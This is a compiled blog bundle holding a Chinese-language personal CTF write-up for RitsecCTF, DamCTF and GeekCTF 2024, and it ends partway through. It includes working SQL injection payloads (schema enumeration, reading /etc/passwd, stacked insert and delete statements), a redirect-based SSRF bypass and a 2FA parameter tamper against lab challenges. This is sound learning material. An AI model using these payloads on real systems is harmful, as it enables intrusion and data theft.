"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[910],{7128:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>a,contentTitle:()=>i,default:()=>h,frontMatter:()=>d,metadata:()=>r,toc:()=>o});var r=c(9451),s=c(4848),l=c(8453);const d={title:"GeekCTF 2024 (+2 small CTFs)",authors:"RibomBalt",tags:["CTF"]},i=void 0,a={authorsImageUrls:[void 0]},o=[{value:"RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 \u4e2a\u4ebaWriteup",id:"ritsecctf-2024--damctf-2024--geekctf-2024-\u4e2a\u4ebawriteup",level:2},{value:"RitsecCTF 2024",id:"ritsecctf-2024",level:2},{value:"crypto - Dastardly Evil Scientists",id:"crypto---dastardly-evil-scientists",level:2},{value:"crypto - Failed File Transfer",id:"crypto---failed-file-transfer",level:2},{value:"crypto - Flag Distribution Server",id:"crypto---flag-distribution-server",level:2},{value:"rev - Go Go Gadget",id:"rev---go-go-gadget",level:2},{value:"pwn - The Gumponent",id:"pwn---the-gumponent",level:2},{value:"web - [Warm Up] Beep Boop",id:"web---warm-up-beep-boop",level:2},{value:"web - Toon Town Fan Club",id:"web---toon-town-fan-club",level:2},{value:"web - Leaked Login",id:"web---leaked-login",level:2},{value:"DamCTF 2024",id:"damctf-2024",level:2},{value:"web-flower",id:"web-flower",level:2},{value:"web - tararchive",id:"web---tararchive",level:2},{value:"misc - gitlabrunner (incomplete)",id:"misc---gitlabrunner-incomplete",level:2},{value:"rev - ssh (incomplete)",id:"rev---ssh-incomplete",level:2},{value:"GeekCTF 2024",id:"geekctf-2024",level:2},{value:"misc - Boy&#39;s Bullet",id:"misc---boys-bullet",level:2},{value:"misc - f and r",id:"misc---f-and-r",level:2},{value:"misc - real or not 1",id:"misc---real-or-not-1",level:2},{value:"misc - whereismyflag",id:"misc---whereismyflag",level:2},{value:"pwn - memo\u7cfb\u5217\uff082/3\uff09",id:"pwn---memo\u7cfb\u521723",level:2},{value:"pwn-flat",id:"pwn-flat",level:2},{value:"\u9ad8\u5730\u5740\u6ea2\u51fa\uff1aUnsorted bin Consolidate + leak LIBC",id:"\u9ad8\u5730\u5740\u6ea2\u51faunsorted-bin-consolidate--leak-libc",level:4},{value:"\u4f4e\u5730\u5740\u6ea2\u51fa\uff1aChunk Extend + Tcache Poisoning",id:"\u4f4e\u5730\u5740\u6ea2\u51fachunk-extend--tcache-poisoning",level:4},{value:"pwn-shellcode",id:"pwn-shellcode",level:2},{value:"1. bypass odd-even check",id:"1-bypass-odd-even-check",level:4},{value:"2. bypass seccomp",id:"2-bypass-seccomp",level:4},{value:"rev - peertrace\uff08\u672a\u505a\u51fa\uff09",id:"rev---peertrace\u672a\u505a\u51fa",level:2},{value:"web - YAJF",id:"web---yajf",level:2},{value:"web - secrets",id:"web---secrets",level:2},{value:"1. \u6e90\u7801\u6cc4\u9732",id:"1-\u6e90\u7801\u6cc4\u9732",level:4},{value:"2. Normal User login\uff1aPython Unicode .upper .lower degeneracy",id:"2-normal-user-loginpython-unicode-upper-lower-degeneracy",level:4},{value:"3. Admin User Login: SQL Unicode CI",id:"3-admin-user-login-sql-unicode-ci",level:4},{value:"web - picbed",id:"web---picbed",level:2},{value:"\u6b63\u89e3\uff1awebp_server_go\u8def\u5f84\u7a7f\u8d8a \uff08CVE-2021-46104\uff0cplus\uff09",id:"\u6b63\u89e3webp_server_go\u8def\u5f84\u7a7f\u8d8a-cve-2021-46104plus",level:4},{value:"\u5931\u8d25\u7684\u5c1d\u8bd5\uff1alibrsvg\u8def\u5f84\u7a7f\u8d8a\uff08CVE-2023-38633\uff0c\u73af\u5883\u7248\u672c\u5df2\u4fee\u590d\uff09",id:"\u5931\u8d25\u7684\u5c1d\u8bd5librsvg\u8def\u5f84\u7a7f\u8d8acve-2023-38633\u73af\u5883\u7248\u672c\u5df2\u4fee\u590d",level:4}];function t(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"ritsecctf-2024--damctf-2024--geekctf-2024-\u4e2a\u4ebawriteup",children:"RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 \u4e2a\u4ebaWriteup"}),"\n",(0,s.jsx)(n.p,{children:"Lysithea"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e24\u5468\u8fde\u7eed\u6253\u4e86\u4e09\u573aCTF\uff0c\u7a0d\u5fae\u6709\u70b9\u8131\u4ea7\u4e86\uff0c\u4f1a\u4f11\u606f\u4e00\u6bb5\u65f6\u95f4\u3002\nRITSEC\u611f\u89c9\u6bd4\u8f83\u4e0d\u592a\u597d\u73a9\uff0cDamCTF\u9898\u91cf\u4e0d\u591a\u4f46\u611f\u89c9\u51fa\u7684\u70b9\u6bd4\u8f83\u5947\u602a\uff08\u8bf4\u4e0d\u4e0a\u96be\uff09\u3002GeekCTF\u5219\u662fNUS\u7b49\u65b0\u52a0\u5761\u9ad8\u6821\u8054\u5408\u529e\u7684",(0,s.jsx)(n.strong,{children:"\u4e2a\u4eba\u5468\u8d5b"}),"\uff0c\u96be\u5ea6\u504f\u9ad8\u800c\u4e14\u5f88\u6709\u8da3\uff0c\u731c\u7684\u8981\u7d20\u4e0d\u591a\uff0c\u662f\u8fd9\u4e09\u4e2a\u6bd4\u8d5b\u91cc\u6211\u6700\u4eab\u53d7\u7684\u3002\n\u987a\u4fbf\u6211\u672c\u6765\u662f\u4e0d\u6253\u7b97\u8ba4\u771f\u6253\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u7528CTFtimes\u7684\u961f\u540d\u767b\u5f55\uff0c\u53cd\u6b63\u6211\u5bf9GeekCTF\u6ca1\u7528CTFtime\u767b\u5f55\u662f\u6709\u70b9\u540e\u6094\u7684\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"[TOC]"}),"\n",(0,s.jsx)(n.h2,{id:"ritsecctf-2024",children:"RitsecCTF 2024"}),"\n",(0,s.jsx)(n.h2,{id:"crypto---dastardly-evil-scientists",children:"crypto - Dastardly Evil Scientists"}),"\n",(0,s.jsxs)(n.p,{children:["DES\u5f31\u5bc6\u94a5\u9898\u3002DES\u67094\u4e2a\u5f31\u5bc6\u94a5\uff0c",(0,s.jsx)(n.code,{children:"'0000000000000000','FFFFFFFFFFFFFFFF','E1E1E1E1F0F0F0F0','1E1E1E1E0F0F0F0F'"}),"\uff0c\u52a0\u5bc6\u548c\u89e3\u5bc6\u64cd\u4f5c\u662f\u4e00\u6837\u7684\u3002\u8fd9\u4e2a\u9898\u7ed9\u51fa\u4e86\u52a0\u5bc6\u7684flag\uff0c\u5e76\u4e14\u80fd\u7ed9\u51fa\u4efb\u610f\u5bc6\u6587\u52a0\u5bc6\uff0c\u4f46\u6ca1\u6709\u89e3\u5bc6\u8fc7\u7a0b\u3002\u786c\u78b0DES\u663e\u7136\u662f\u4e0d\u53ef\u53d6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9996\u5148\u8981\u770b\u770b\u662f\u4e0d\u662f\u5f31\u5bc6\u94a5\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"crypto---failed-file-transfer",children:"crypto - Failed File Transfer"}),"\n",(0,s.jsx)(n.p,{children:"\u7ed9\u4e86\u4e09\u7ec4RSA\u516c\u94a5\u548c\u5bc6\u6587\uff0c\u9898\u5e72\u8bf4\u662f\u52a0\u5bc6\u76f8\u540c\u7684\u4fe1\u606f\u3002\u516c\u94a51\u548c2\u7684N\u662f\u4e00\u6837\u7684\uff0c\u7136\u540e\u516c\u94a51\u548c\u516c\u94a53\u5c45\u7136\u6709\u6700\u5927\u516c\u7ea6\u6570\uff0cgcd\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u610f\u4e49\u4e0d\u660e\u3002\n\u987a\u4fbf\u867d\u7136\u516c\u94a53\u7684e=3\uff0c\u4f46\u662fN\u8fd8\u662f\u592a\u5927\u4e86\u4e0d\u9002\u5408\u76f4\u63a5\u7206\u7834\u660e\u6587\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"crypto---flag-distribution-server",children:"crypto - Flag Distribution Server"}),"\n",(0,s.jsx)(n.p,{children:"\u76f8\u5bf9\u6709\u8da3\u7684\u4e00\u9053\u9898\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u6ca1\u6709\u6e90\u7801\uff0c\u53ea\u6709nc\u670d\u52a1\u5668\u3002\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u3010\u683c\u5f0f\u3011\u548c\u3010IV\u3011\uff0c\u7136\u540e\u6253\u5370\u51faflag\u7684\u5bc6\u6587\u3002\u9996\u5148\u63d0\u4f9b\u4e0d\u5339\u914d\u957f\u5ea6\u7684IV\uff0c\u53ef\u4ee5\u8ba9\u670d\u52a1\u5668\u62a5\u9519\uff0c\u6cc4\u9732\u90e8\u5206\u6e90\u7801\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'Traceback (most recent call last):\n  File "/app/run", line 89, in <module>\n  File "/app/run", line 76, in main\n    cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv)\n             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/AES.py", line 228, in new\n    return _create_cipher(sys.modules[__name__], key, mode, *args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/__init__.py", line 79, in _create_cipher\n    return modes[mode](factory, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/_mode_cbc.py", line 287, in _create_cbc_cipher\n    raise ValueError("Incorrect IV length (it must be %d bytes long)" %\nValueError: Incorrect IV length (it must be 16 bytes long)\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u6240\u4ee5\u8fd9\u5e94\u8be5\u662fAES128-CBC\u52a0\u5bc6\u3002\u81f3\u4e8e\u683c\u5f0f\uff0c\u6839\u636enc\u7ed9\u7684\u793a\u4f8b\u548c\u4e00\u4e9bfuzz\uff0c\u53ef\u4ee5\u5f97\u77e5\u7c7b\u4f3c\u4e8e",(0,s.jsx)(n.code,{children:"fmt.format(flag)"}),"\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u4f20",(0,s.jsx)(n.code,{children:"{0}"}),", ",(0,s.jsx)(n.code,{children:"{}"}),", ",(0,s.jsx)(n.code,{children:"{0:s}"}),"\u8fdb\u53bb\uff0c\u5927\u62ec\u53f7\u9700\u8981\u53cc\u5199\uff0c\u4f46\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u4f20\u4e0d\u4e86",(0,s.jsx)(n.code,{children:"{0[0]}"}),"\uff08\u5982\u679c\u80fd\u4f20\u8fd9\u4e2a\u9898\u4f1a\u5f31\u5316\u5f88\u591a\uff09\u3002\u540c\u65f6\u6839\u636eflag\u5bc6\u6587\u7684\u8fd4\u56de\uff0c\u6211\u4eec\u5224\u65adflag\u672c\u8eab\u957f\u5ea6\u4e0d\u4f1a\u8d85\u8fc732\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u5904\u7406flag\u4f4d\u4e8e\u7b2c\u4e00\u4e2ablock\u548c\u7b2c\u4e8c\u4e2ablock\u4e24\u79cd\u60c5\u51b5\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u7531\u4e8eIV\u53ef\u63a7\uff0c\u524d16\u4e2a\u5b57\u8282\u6bd4\u8f83\u5bb9\u6613\u3002\u6211\u4eec\u9996\u5148\u5f97\u5230",(0,s.jsx)(n.code,{children:"'\\0' * 0x10"}),"\u5728ECB\u610f\u4e49\u4e0b\u7684\u5bc6\u6587\uff0c\u7136\u540e\u56e0\u4e3aCBC\u7684\u7b2c\u4e00\u5757\u5bc6\u6587\u7b49\u4e8e",(0,s.jsx)(n.code,{children:"f(IV ^ plain1)"}),"\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u5728\u660e\u6587\u683c\u5f0f\u524d\u9762\u75590xf\u4e2a",(0,s.jsx)(n.code,{children:"\\0"}),"\uff0c\u5728IV\u4e2d\u904d\u5386\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u76f4\u5230\u548c\u7b2c\u4e00\u8f6e\u7ed3\u679c\u76f8\u540c\uff0c\u6211\u4eec\u5c31\u7206\u51fa\u4e86\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u56e0\u4e3a\u5df2\u77e5\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u7528\u540c\u6837\u65b9\u6cd5\u7206\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u7b26\uff0c\u76f4\u5230\u524d0x10\u4e2a\u5b57\u7b26\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u540e\u534a\u90e8\u5206\u7a0d\u5fae\u96be\u4e00\u70b9\u3002\u56e0\u4e3a\u540e16\u4e2a\u5b57\u7b26\u7684IV\u4e0d\u53ef\u63a7\uff08\u5373\u7b2c\u4e00\u5757\u5bc6\u6587\uff09\u3002\u4f46\u5176\u5b9e\u6211\u4eec\u53ea\u8981\u77e5\u9053\u7b2c\u4e00\u5757\u5bc6\u6587\u548c\u7b2c\u4e8c\u5757\u5bc6\u6587\uff08\u968f\u673a\u52a0\u5bc6\u4e00\u6b21\u5c31\u53ef\u505a\u5230\uff09\uff0c\u4ee5\u53ca\u7b2c\u4e8c\u5757\u660e\u6587\u7684\u524dn-1\u4e2a\u5b57\u7b26\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628a\u8fd9\u4e2a\u8fc7\u7a0b\u63d0\u5230\u7b2c\u4e00\u5757\u6765\uff0c\u8fd9\u6837\u6211\u4eec\u53c8\u53ef\u4ee5\u904d\u5386IV\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u4e86\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:c(2709).A+"",children:"exp"})}),"\n",(0,s.jsx)(n.h2,{id:"rev---go-go-gadget",children:"rev - Go Go Gadget"}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e00\u6b21\u6253Golang\u9006\u5411\uff08checksec\u53ef\u77e5\uff09\u3002\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u79cd\u65f6\u5019\u8fd8\u662f\u5f97\u9760\u5de5\u5177\u554a\uff0c\u627e\u4e86\u4e00\u4e2aGhidra\u7684",(0,s.jsx)(n.code,{children:"GolangAnalyzerExtension"}),"\u63d2\u4ef6\uff0coneshot\u4e00\u4e0b\u5206\u6790\uff0c\u81f3\u5c11\u53ef\u4ee5\u5feb\u901f\u770b\u51fa\u6211\u4eec\u8981\u627e\u7684\u51fd\u6570\uff08evil.go\u4e2d\u7684main.main\uff0c\u5176\u4ed6\u90fd\u662f\u5e93\u51fd\u6570\uff09\u3002\u7ed3\u5408\u9006\u5411\u7684\u51fd\u6570\u540d\u901a\u8bfb\u903b\u8f91\uff0c\u5c31\u662f\u4e00\u4e2a\u5faa\u73afstrxor\uff0c\u5bc6\u94a5\u662fsecret\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"pwn---the-gumponent",children:"pwn - The Gumponent"}),"\n",(0,s.jsx)(n.p,{children:"\u6ca1\u4efb\u4f55\u8425\u517b\u7684\u6808\u6ea2\u51fa"}),"\n",(0,s.jsx)(n.h2,{id:"web---warm-up-beep-boop",children:"web - [Warm Up] Beep Boop"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a\u9898\u6709\u4e2a\u7279\u70b9\uff0c\u7f51\u9875\u4e0a\u4efb\u4f55\u4e1c\u897f\u90fd\u4e0d\u662fCTF\u7f51\u7ad9\u7684\uff0c\u800c\u662fiframe\u94fe\u5230\u5916\u9762\u3002\u56e0\u4e3a\u8fd9\u4e2a\u9898\u662fwarmup\uff0c\u6240\u4ee5\u4e0d\u53ef\u80fd\u6709\u592a\u590d\u6742\u7684\u4e1c\u897f\uff0c\u5c31\u770b\u4e86\u4e00\u773crobots.txt\uff0c\u597d\u4e86\uff0c\u5c31\u5728\u8fd9\u91cc\uff0c\u6709\u4e2aBase64\u4e32"}),"\n",(0,s.jsx)(n.h2,{id:"web---toon-town-fan-club",children:"web - Toon Town Fan Club"}),"\n",(0,s.jsx)(n.p,{children:"\u6bd4\u8f83\u7b80\u5355\u7684SQL\u6ce8\u5165\u3002\u4f46\u6211\u672c\u8eab\u5c31\u4e0d\u592a\u64c5\u957fSQLi\u6240\u4ee5\u53ef\u4ee5\u8bf4\u96be\u5ea6\u5339\u914d\u6b63\u5e38\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\u5f88\u5bb9\u6613\u5728\u641c\u7d22\u9875\u9762\u8bd5\u51fa\u6765",(0,s.jsx)(n.code,{children:"1' or 1=1 #1"}),"\u662f\u6709\u6548\u7684\uff08\u6211\u53d1\u73b0",(0,s.jsx)(n.code,{children:"--"}),"\u6ce8\u91ca\u7b26\u53f7\u597d\u50cf\u4e0d\u597d\u7528\uff0c\u4e0d\u77e5\u9053\u548csql\u7248\u672c\u6709\u6ca1\u6709\u5173\u7cfb\uff09\u3002\u7136\u540e\u5f88\u5bb9\u6613union\u8bd5\u51fa\u6765\u53d6\u7684\u53d8\u91cf\u662f\u4e09\u4e2a\u3002\u7136\u540e\u5f00\u59cb\u62ff\u6570\u636e\u5e93\u540d\uff0c\u8868\u540d\uff0c\u5217\u540d"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:"' databases\n' and 1=2 union select schema_name,2,3 from information_schema.schemata #\n' tables\n' and 1=2 union select table_schema, table_name,3 from information_schema.tables where table_schema !='information_schema' #\n' columns\n' and 1=2 union SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name = 'post' limit 1 # \n' version (load_file not work)\n' and 1=2 union SELECT version(), load_file('/etc/passwd'), name from post #\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4e09\u4e2a\u5217\u540d\u5206\u522b\u662fname, slug\u548cfilename\u3002name\u5e94\u8be5\u662fID\uff0cslug\u662fURL endpoint\uff08\u6bd4\u5982\u8bbf\u95ee",(0,s.jsx)(n.code,{children:"/blog/:slug"}),"\uff09\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5bf9\u5e94\u5185\u5bb9\uff0c\u800c\u5185\u5bb9\u4fdd\u5b58\u8def\u5f84\u5c31\u662ffilename\u3002\u5982\u679c\u80fd\u6539filename\u6211\u4eec\u53ef\u80fd\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u9700\u8981\u63d0\u4e00\u4e0b\u8fd9\u4e2a\u9898\u662f\u5171\u4eabinstance\u7684\uff0c\u7136\u540e\u6211\u505a\u9898\u7684\u65f6\u5019\u5c31\u53d1\u73b0\u6709\u5176\u4ed6\u4eba\u4e00\u76f4\u5f80\u91cc\u9762\u52a0\u5947\u5947\u602a\u602a\u7684\u6761\u76ee\uff0c\u4f46\u597d\u50cf\u4e00\u4f1a\u5c31\u4f1a\u5220\u6389\u3002\u6240\u4ee5\u6211\u8ba4\u4e3a\u8fd9\u4e2a\u9898\u5f88\u53ef\u80fd\u80fdinsert\u3002\u4f46\u662fselect\u5b50\u53e5\u91cc\u662f\u4e0d\u80fd\u63d2\u5165insert\u7684\u3002\u7136\u800c\u6211\u4eec\u53ef\u4ee5\u5206\u53f7\u65ad\u6210\u4e24\u53e5\uff0c\u5c31\u53ef\u4ee5insert\u4e86\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:"' my_name is random generated uuid to slow others from accessing\n' and 1=2; insert into post (name, slug, filename) values ('kusanagi_nene', '{my_name}', 'flag.txt')#\n' dont forget to clear up evidence (but it seems deleting wont work somehow)\n' and 1=2; delete from post where name='kusanagi_nene'#\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u55ef\uff0c\u5c31\u8fd9\u6837\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"web---leaked-login",children:"web - Leaked Login"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u9898\u4e5f\u6bd4\u8f83\u5947\u602a\u3002\u9898\u76ee\u7ed9\u4e86\u767b\u5f55\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u4e24\u6b65\u9a8c\u8bc1OTP code\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e00\u822c\u4e24\u6b65\u9a8c\u8bc1\u662f\u4f1a\u5411TOTP\u670d\u52a1\u5668\u53d1\u4e00\u4e2a\u8bf7\u6c42\uff0c\u7136\u540eTOTP\u6839\u636e\u7ed3\u679c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8bf7\u6c42\uff0c\u5305\u62ec\u9a8c\u8bc1\u662f\u5426\u901a\u8fc7\uff0c\u539f\u672c\u91cd\u5b9a\u5411\u7684\u8d44\u6e90\u7b49\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u9a8c\u8bc1\u662f\u5426\u901a\u8fc7\u5c31\u770b",(0,s.jsx)(n.code,{children:"flag.php"}),"POST\u53c2\u6570\u91cc\u662f\u5426\u6709\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"goodness"}),"\u53c2\u6570\uff0c\u5982\u679c\u4e0d\u901a\u8fc7\u8fd9\u4e2a\u53c2\u6570\u662f0\u3002\u5982\u679c\u6211\u624b\u52a8\u6539\u4e3a1\uff0c\u90a3\u5c31\u901a\u8fc7\u4e86\uff0c\u5c31\u62ff\u5230flag\u4e86\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u771f\u5b9e\u7684TOTP\u4e0d\u4f1a\u8fd9\u4e48\u7b80\u5355\u7684\uff0c\u4e00\u5b9a\u662f\u5305\u542b\u4e86\u52a0\u5bc6\u548c\u590d\u6742\u9006\u5411\u8fc7\u7a0b\u3002\u4f46\u786e\u5b9e\u662f\u6709\u4f2a\u9020\u7684\u53ef\u80fd\u6027\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"damctf-2024",children:"DamCTF 2024"}),"\n",(0,s.jsx)(n.h2,{id:"web-flower",children:"web-flower"}),"\n",(0,s.jsx)(n.p,{children:"\u6e90\u7801\u7ed9\u4e86\u5f88\u957f\uff0c\u662f\u4e00\u4e2aflask\u670d\u52a1\uff0c\u901a\u5916\u7f51\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u654f\u611f\u670d\u52a1\u5305\u62ec\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f",(0,s.jsx)(n.code,{children:"/special_flower"}),"\uff0c\u4f1a\u5224\u65ad",(0,s.jsx)(n.code,{children:"request.remote_addr"}),"\u662f\u5426\u4e3a\u56db\u7c7b\u672c\u5730IP\uff0c\u5982\u679c\u662f\u5219\u8fd4\u56de",(0,s.jsx)(n.code,{children:"flag.png"}),"\u3002\u56e0\u4e3a\u6b63\u786e\u914d\u7f6e\u4e86ProxyFix\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728XFF\u7ed5\u8fc7\u7684\u53ef\u80fd\u6027\u3002\uff08\u4e00\u822c\u6765\u8bf4XFF\u662f\u4e0d\u80fd\u4fe1\u4efb\u7684\uff0c\u4f46\u5982\u679c\u670d\u52a1\u5668\u5728NGINX\u7b49\u53cd\u4ee3\u670d\u52a1\u5668\u540e\u9762\uff0c\u5219\u53ef\u4ee5\u4fe1\u4efb\u6700\u540e\u4e00\u7ea7\uff0c\u8fd9\u4f3c\u4e4e\u4e5f\u662f",(0,s.jsx)(n.code,{children:"werkzeug.ProxyFix"}),"\u7684\u9ed8\u8ba4\u53c2\u6570\uff09"]}),"\n",(0,s.jsxs)(n.p,{children:["\u53e6\u4e00\u4e2a\u662f",(0,s.jsx)(n.code,{children:"/filter_flower"}),"\uff0c\u8fd9\u4e2a\u662f\u4e00\u4e2a\u901a\u5916\u7f51\u7684\u641c\u7d22\u670d\u52a1\uff0c\u9996\u5148\u4f1a\u5bf9URL\u505a\u5224\u65ad\uff0c\u7528",(0,s.jsx)(n.code,{children:"urllib.parse"}),"\u5f97\u5230hostname\uff0c\u518d\u7528",(0,s.jsx)(n.code,{children:"dnspython"}),"\u67e5\u8be2IP\uff0c\u5982\u679c\u4e3a\u56db\u7c7b\u672c\u5730IP\u5219\u76f4\u63a5abort\uff0c\u770b\u8d77\u6765\u8fc7\u6ee4\u4e86SSRF\u3002\u4e4b\u540e\uff0c\u4f1a\u7528requests\u8fdb\u884c\u8bf7\u6c42\uff0c\u4f1a\u8c03\u7528\u4e00\u4e2a\u6df7\u6dc6\u7684\u5bc6\u6587\uff0c\u5b9e\u9645\u529f\u80fd\u662f\u5224\u65adURL path\u7684\u540e\u7f00\u6216\u8005\u8bf7\u6c42\u5934\u662f\u5426\u4e3apng\u56fe\u7247\uff0c\u5982\u679c\u662f\u5219\u8fd4\u56de\u56fe\u7247\u5185\u5bb9\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"_ = (proprietary_secret_ai_algorithm := 'Cih2Oj1yYW5kb20uY2hvaWNlcyhbMTQyNSwyMzQsMTIsMHg3QiwtOTEyLDU2LDg3LDI5NCwweDIwLDM5NCwzOCwweDRELDgwMCwxMjMsMzU2LDB4N0QsMTI4NywxNzEyLDMyLDBdLGs9NCksdls6Oi0xXVtpbnQuZnJvbV9ieXRlcyhieXRlcyhmbG93ZXJbMTAwOjEwNF0pKSAlIDRdLy84ICsgdlszXSUyMCA8IDI2MCBhbmQgKHBhdGgubG93ZXIoKS5lbmRzd2l0aCgoJy5wbmcnLCcuanBnJywnLmpwZWcnLCcuYm1wJykpIG9yIGZsb3dlci5zdGFydHN3aXRoKGJ5dGVzKFsweDg5LCAweDUwLCAweDRFLCAweDQ3LCAweDBELCAweDBBLCAweDFBLCAweDBBXSkpKSlbMV0gCg==',\nproprietary_secret_ai_algorithm:=base64.b64decode(proprietary_secret_ai_algorithm))\nis_flower = compile(proprietary_secret_ai_algorithm, \"<0x1172947815>\", \"eval\")\n# equals to \nv:=random.choices([1425,234,12,0x7B,-912,56,87,294,0x20,394,38,0x4D,800,123,356,0x7D,1287,1712,32,0], k=4),\n    v[::-1][int.from_bytes(bytes(flower[100:104])) % 4]//8 + v[3]%20 < 260 \n    and (path.lower().endswith(('.png','.jpg','.jpeg','.bmp')) or flower.startswith(b'\\x89PNG\\r\\n\\x1a\\n'))\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4e00\u5f00\u59cb\u8bd5\u4e86\u5f88\u4e45\u80fd\u4e0d\u80fd\u901a\u8fc7\u75c5\u6001\u7684URL\uff0c\u4f7f\u5f97dnspython\u89e3\u6790\u4e0d\u51fa\u672c\u5730IP\uff0c\u540c\u65f6requests\u80fd\u8bbf\u95ee\u672c\u5730\u56fe\u7247\uff0c\u4f46\u8bd5\u4e86\u5f88\u4e45\u505a\u4e0d\u5230\uff0c\u4e3b\u8981\u662f",(0,s.jsx)(n.code,{children:"dnspython"}),"\u5bf9IP\u5730\u5740\u548c\u4e0d\u5b58\u5728\u7684\u57df\u540d\u4f1a\u62a5\u9519\uff0c\u800c\u4e0d\u662f\u8fd4\u56de\u4e00\u4e2a\u9ed8\u8ba4\u503c\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u6700\u540e\u5ffd\u7136\u60f3\u5230\uff0c\u6211\u76f4\u63a5\u7528302\u8df3\u8f6c\u4e0d\u5c31\u89e3\u51b3\u4e86\uff1f\u57df\u540d\u89e3\u6790\u8fc7\u7a0b\u5fc5\u7136\u4e0d\u4f1a\u5904\u7406302\uff0c\u800crequests\u8bbf\u95ee\u5185\u5bb9\u65f6\uff0c\u6211\u7528302\u8df3\u8f6c\u76f4\u63a5\u8df3\u5230",(0,s.jsx)(n.code,{children:"localhost/special_flower"}),"\uff0c\u56e0\u4e3arequests\u9ed8\u8ba4\u4f1a\u8ddf\u8e2a302\uff0c\u5c31\u80fd\u7ed5\u8fc7SSRF\u4e86\u3002\uff08\u987a\u4fbfrequests\u4e0d\u89e3\u6790javascript\uff0c",(0,s.jsx)(n.code,{children:"location.href"}),"\u662f\u65e0\u6548\u7684\uff09"]}),"\n",(0,s.jsx)(n.h2,{id:"web---tararchive",children:"web - 